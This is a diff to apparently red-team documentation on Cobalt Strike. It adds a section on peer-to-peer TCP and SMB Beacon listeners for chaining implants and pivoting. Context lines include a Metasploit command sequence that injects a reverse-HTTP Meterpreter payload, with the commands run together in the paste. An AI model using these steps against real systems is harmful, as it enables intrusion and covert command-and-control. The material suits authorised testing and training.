@@ -275,6 +275,16 @@ And, here’s what this looks like in the Metasploit Framework console:
 | <p><code>use exploit/windows/local/payload_injectset</code> </p><p><code>PAYLOAD windows/meterpreter/reverse_httpset</code> </p><p><code>LHOST [IP address of compromised system]</code></p><p><code>set LPORT 80set SESSION 1</code></p><p><code>set DisablePayloadHandler True</code></p><p><code>exploit –j</code></p> |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 
+#### Peer-to-Peer Listeners
+
+Peer-to-Peer (P2P) listeners allow Beacons to link their communications together to form a chain. The P2P types in Cobalt Strike are **TCP** and **SMB**.
+
+Linking Beacons is especially useful when it comes to pivoting, privilege escalation and any other situation where you need to spawn an additional Beacon payload. They help keep the number of direct outbound connections to your attacking infrastructure low and for machines and/or principals that can't send HTTP/S outbound at all.
+
+Creating P2P listeners can be done in the **Listeners** menu, by selecting the **TCP** or **SMB** Beacon payload type. These listeners integrate into all the relevant Cobalt Strike workflows such as `spawn`, `spawnas`, `inject` and `jump`; and payloads for these listeners can also be generated in the same way from the **Attacks** menu.
+
+If executing a P2P payload on a target manually, it won't appear in the UI until the `link` (for SMB Beacons) or `connect` (for TCP Beacons) command is used. You can also `unlink` P2P Beacons and then use `link` again from another Beacon to reorganise the chain.
+
 ## References
 
 [https://www.cobaltstrike.com/downloads/csmanual313.pdf](https://www.cobaltstrike.com/downloads/csmanual313.pdf)
